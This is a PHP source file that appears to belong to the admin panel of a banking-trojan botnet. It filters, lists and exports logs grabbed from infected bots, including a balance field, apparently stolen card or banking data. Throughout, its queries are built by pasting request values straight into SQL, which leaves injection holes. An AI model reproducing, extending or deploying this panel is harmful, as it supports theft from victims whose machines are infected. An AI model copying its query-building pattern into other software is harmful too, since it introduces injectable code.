<?php

function save_logs($row){
    global $file_name;
    
    if(!empty($row->log)) file_put_contents($file_name, $row->log . "\r\n\r\n", FILE_APPEND);
}

$gen = true;

if($_SESSION['user']->config['infoacc'] == '1'){
    if($_SESSION['user']->config['systems']['cc'] != true){
        $gen = false;
        header('Location: /logs/');
        exit;
    }
}

if(isset($_POST['saves']) && isset($_POST['saves']) && $gen == true){
    set_time_limit(0);
    error_reporting(-1);
    ini_set('max_execution_time', 0);
    
    $file_name = 'cc_';
    $filter = '';
    
    unset($_POST['saves']);
    foreach($_POST as $key => $value){
        if(!empty($value)){
            $file_name .= strtolower($value) . '_';
            switch($key){
                case 'uid':
                    if(preg_match('~^([a-zA-Z]+)$~is', $value)){
                        $filter .= ' AND (prefix = \''.$value.'\') ';
                    }elseif(preg_match('~^([a-zA-Z0-9]+)$~is', $value)){
                        $value = explode('0', $value, 2);
                        if(preg_match('~^([a-zA-Z]+)$~is', $value[0])){
                            $value[1] = '0' . $value[1];
                            $filter .= ' AND ((prefix = \''.$value[0].'\') AND (uid = \''.$value[1].'\')) ';
                        }else{
                            $_SESSION['search']['cc'][$key] = '';
                        }
                    }else{
                        $_SESSION['search']['cc'][$key] = '';
                    }
                break;
            
                case 'save':
                    if($value == 'nuls'){
                        $filter .= ' AND (save = \'0\') ';
                    }else{
                        $filter .= ' AND (save != \'0\') ';
                    }
                break;
                
                case 'subsys':
                    if($value != 'ALL') $filter .= ' AND (subsys = \''.$value.'\') ';
                break;
                
                case 'date':
                    if($value != 'ALL') $filter .= ' AND (DATE(post_date) = \''.$value.'\') ';
                break;
            }
        }
    }
    
    $file_name =  'cache/zips/' . rtrim($file_name, '_') . '.txt';
    file_put_contents($file_name, '');
    $file_name = realpath($file_name);
    
    do{
        $rand = mt_rand('1', '9999999');
        $count = $mysqli->query_name('SELECT COUNT(*) count FROM bf_log_info' . ' WHERE (save = \''.$rand.'\')');
    }while($count != 0);
    
    $mysqli->query('update bf_log_info set save = \''.$rand.'\' WHERE (system = \'cc\') '.$filter);
    $mysqli->query('SELECT log FROM bf_log_info WHERE (save = \''.$rand.'\') ', null, 'save_logs');
    
    if(filesize($file_name) > 0){
        header( 'Content-Disposition: attachment; filename="' . basename($file_name) . '"');
        if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
            header( 'X-LIGHTTPD-send-file: ' . $file_name);
        }elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
            header('X-Sendfile: ' . $file_name);
        }
    }else{
        header("HTTP/1.1 404 Not Found");
        header("Status: 404 Not Found");
    }
    
    exit;
}

get_function('html_pages');
$page['count_page'] = 100;

if(isset($_POST['update']) && $gen == true){
    @array_walk($_POST, "sql_inject");
    @array_walk($_POST, 'real_escape_string');
    unset($_POST['update']);
    
    foreach($_POST as $key => $value){
        if($key != 'cmd' && $key != 'link'){
            $_SESSION['search']['cc'][$key] = trim($value);
        }
    }
}

$filter = '';

if(count($_SESSION['search']['cc'])){
    foreach($_SESSION['search']['cc'] as $key => $value){
        if(!empty($value)){
            switch($key){
                case 'uid':
                    if(preg_match('~^([a-zA-Z]+)$~is', $value)){
                        $filter .= ' AND (prefix = \''.$value.'\') ';
                    }elseif(preg_match('~^([a-zA-Z0-9]+)$~is', $value)){
                        $value = explode('0', $value, 2);
                        if(preg_match('~^([a-zA-Z]+)$~is', $value[0])){
                            $value[1] = '0' . $value[1];
                            $filter .= ' AND ((prefix = \''.$value[0].'\') AND (uid = \''.$value[1].'\')) ';
                        }else{
                            $_SESSION['search']['cc'][$key] = '';
                        }
                    }else{
                        $_SESSION['search']['cc'][$key] = '';
                    }
                break;
            
                case 'save':
                    if($value == 'nuls'){
                        $filter .= ' AND (save = \'0\') ';
                    }else{
                        $filter .= ' AND (save != \'0\') ';
                    }
                break;
                
                case 'subsys':
                    if($value != 'ALL') $filter .= ' AND (subsys = \''.strtolower($value).'\') ';
                break;
                
                case 'date':
                    if($value != 'ALL') $filter .= ' AND (DATE(post_date) = \''.$value.'\') ';
                break;
            }
        }
    }
}

function get_date($row){
    global $date;
    $date[$row->date] = true;
}

function get_sys($row){
    global $sys;
    //$sys[strtoupper(str_replace('_grab', '', $row->subsys))] = true;
    $sys[strtoupper($row->subsys)] = true;
}

$date = array();
$sys = array();

if($gen == true){
    $mysqli->query('SELECT distinct(DATE(post_date)) date FROM bf_log_info WHERE (system = \'cc\')', null, 'get_date');
    $mysqli->query('SELECT distinct(subsys) subsys FROM bf_log_info WHERE (system = \'cc\')', null, 'get_sys');
    
    $smarty->assign('date', $date);
    $smarty->assign('sys', $sys);
    
    $counts = $mysqli->query_name('SELECT COUNT(distinct(concat(prefix, uid))) count FROM bf_log_info WHERE (system = \'cc\') ' . $filter);
    $smarty->assign('counts', $counts);
    $smarty->assign("list", $mysqli->query('SELECT prefix, uid, balance, post_date, COUNT(id) count FROM bf_log_info WHERE (system = \'cc\') '.$filter.' GROUP by prefix, uid ORDER by id DESC LIMIT '.($Cur['page'] == 0 ? 0 : $Cur['page']*$page['count_page']).','.$page['count_page'], null, null, false));
    $smarty->assign('pages', html_pages('/logs/cberfiz.html?', $counts, $page['count_page']));
}

$smarty->assign('title', $lang['logs']);

?>